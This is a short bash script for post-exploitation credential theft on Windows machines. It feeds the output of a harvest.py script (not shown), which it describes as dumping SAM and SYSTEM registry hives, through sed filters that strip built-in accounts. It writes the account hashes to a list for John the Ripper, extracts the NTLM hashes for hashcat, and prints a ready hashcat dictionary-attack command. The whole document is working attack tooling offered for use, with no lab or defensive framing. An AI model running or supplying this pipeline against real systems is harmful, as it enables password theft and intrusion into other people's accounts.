#!/bin/bash
# harvest all SAM & SYSTEM hives scrape out all worthless accounts using sed
# pipe to tee so john the ripper can use for cracking
# pipe that to cut grab just the NTLM hashes from the list and tee those out to hashcat for cracking
./harvest.py | sed "s:ASPNET.*::g" | sed "s:SUPPORT.*::g" | sed "s:HelpAssistant.*::g" | sed "s:HomeGroupUser.*::g" | sed "s:ERR\: ::g" | sed "s:Couldn't find.*::g" | sort -u | tee john.lst | cut -f 1,4 -d ":" | tee hashcat.lst
echo "Run hashcat to recover passwords"
echo "hashcat --username --status -m 1000 -a 0 -o cracked.txt --remove /media/hashcat.lst /usr/share/sqlmap/txt/wordlist.txt"
